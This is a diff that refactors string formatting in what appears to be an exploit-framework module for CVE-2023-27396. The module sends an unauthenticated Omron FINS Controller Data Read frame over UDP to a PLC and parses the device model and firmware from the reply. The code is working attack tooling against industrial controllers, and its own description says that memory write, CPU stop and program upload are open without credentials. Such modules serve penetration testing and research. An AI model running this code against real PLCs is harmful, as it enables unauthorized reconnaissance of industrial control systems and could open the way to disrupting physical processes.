@@ -71,7 +71,7 @@ def _build_fins(command: bytes, data: bytes = b"") -> bytes:
 _FINS_IDENTITY = _build_fins(_CMD_CONTROLLER_DATA_READ)
 
 
-def _send_fins(target: str, port: int, frame: bytes, timeout: int) -> Optional[bytes]:
+def _send_fins(target: str, port: int, frame: bytes, timeout: int) -> bytes | None:
     """Send FINS frame via UDP, return response bytes or None."""
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sock.settimeout(timeout)
@@ -93,8 +93,8 @@ def _parse_fins_identity(resp: bytes) -> dict:
 
     mres = resp[12]
     sres = resp[13]
-    result["MRES"] = "0x{:02X}".format(mres)
-    result["SRES"] = "0x{:02X}".format(sres)
+    result["MRES"] = f"0x{mres:02X}"
+    result["SRES"] = f"0x{sres:02X}"
     result["AuthRequired"] = "NO" if mres == 0x00 else "YES"
 
     if len(resp) >= 30 and mres == 0x00:
@@ -169,15 +169,13 @@ class Exploit(Exploit):
         if self.simulate:
             DestructiveGate.print_simulation(
                 description=(
-                    "Would send FINS Controller Data Read (0x0501) to {}:{}/UDP "
+                    f"Would send FINS Controller Data Read (0x0501) to {self.target}:{self.port}/UDP "
                     "without any credentials. CVE-2023-27396 (CVSS 9.8) — Omron CJ2M "
                     "responds with device model, firmware version, and error code 0x0000 "
                     "(success) without requiring authentication. Full FINS command set "
-                    "is available: memory read/write, CPU start/stop, program upload.".format(
-                        self.target, self.port
-                    )
+                    "is available: memory read/write, CPU start/stop, program upload."
                 ),
-                payload_hex=" ".join("{:02X}".format(b) for b in _FINS_IDENTITY),
+                payload_hex=" ".join(f"{b:02X}" for b in _FINS_IDENTITY),
                 payload_human=(
                     "FINS frame: ICF=0x80 | SID=0xAB | "
                     "CMD=0x0501 (Controller Data Read) | no auth field"
@@ -186,9 +184,7 @@ class Exploit(Exploit):
             )
             return
 
-        print_status("[CVE-2023-27396] Sending FINS identity request to {}:{}/UDP...".format(
-            self.target, self.port
-        ))
+        print_status(f"[CVE-2023-27396] Sending FINS identity request to {self.target}:{self.port}/UDP...")
         resp = _send_fins(self.target, self.port, _FINS_IDENTITY, self.timeout)
         if resp is None:
             print_error("[CVE-2023-27396] No FINS response — device not found or port filtered.")
@@ -215,4 +211,4 @@ class Exploit(Exploit):
                     info.get("MRES", "?")
                 )
             )
-            print_info("[CVE-2023-27396] Raw: {}".format(resp[:32].hex()))
+            print_info(f"[CVE-2023-27396] Raw: {resp[:32].hex()}")
